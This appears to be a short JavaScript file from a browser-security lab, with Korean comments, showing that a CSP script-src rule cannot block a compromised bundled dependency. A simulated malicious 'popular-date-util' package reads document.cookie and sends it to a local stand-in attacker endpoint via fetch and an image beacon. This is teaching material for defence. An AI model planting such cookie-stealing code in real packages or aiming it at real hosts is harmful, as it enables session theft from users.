// ── 우리 앱 코드 ──────────────────────────────────────────────
lab.log("ok", "앱 번들 실행됨 (nonce 로 정당하게 실행된 우리 스크립트)");

// ── node_modules/popular-date-util (악성 버전이 배포된 상태) ──────
// script-src 는 이 코드를 막을 수 없다. 우리 번들의 일부이기 때문이다.
(() => {
  const stolen = encodeURIComponent(document.cookie);

  fetch(`http://localhost:4000/steal?via=compromised-dep%20(fetch)&c=${stolen}`, { mode: "no-cors" })
    .then(() => lab.log("pwn", "오염된 의존성: fetch 로 쿠키 유출 성공"))
    .catch(() => lab.log("fail", "오염된 의존성: fetch 유출 차단됨 (connect-src)"));

  const beacon = new Image();
  beacon.src = `http://localhost:4000/steal?via=compromised-dep%20(img%20beacon)&c=${stolen}`;
  lab.log("pwn", "오염된 의존성: <img> 비콘으로도 유출 시도 (공격자 대시보드에서 확인)");
})();
